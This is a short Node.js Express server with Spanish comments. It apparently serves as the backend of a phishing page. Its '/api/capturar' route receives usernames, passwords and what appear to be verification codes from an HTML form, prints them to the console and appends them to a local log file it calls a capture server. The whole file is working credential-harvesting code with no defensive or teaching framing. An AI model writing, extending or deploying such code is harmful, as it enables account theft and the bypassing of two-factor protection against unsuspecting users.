const express = require('express');
const cors = require('cors');
const fs = require('fs');
const app = express();

// Middlewares
app.use(cors()); // Permite que el HTML se comunique con el servidor
app.use(express.json()); // Permite leer datos en formato JSON

// Ruta para recibir los datos
app.post('/api/capturar', (req, res) => {
    const { usuario, clave, codigo } = req.body;
    const logEntry = `[${new Date().toLocaleString()}] USUARIO: ${usuario} | CLAVE: ${clave} | CODIGO: ${codigo}\n`;

    // 1. Mostrar en la consola del servidor
    console.log("Datos capturados:", logEntry);

    // 2. Guardar en un archivo local llamado registros.txt
    fs.appendFile('registros.txt', logEntry, (err) => {
        if (err) {
            console.error("Error al escribir el archivo", err);
            return res.status(500).send("Error interno");
        }
        res.status(200).json({ status: "success", message: "Datos recibidos" });
    });
});

// Iniciar servidor
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Servidor de captura activo en puerto ${PORT}`);
});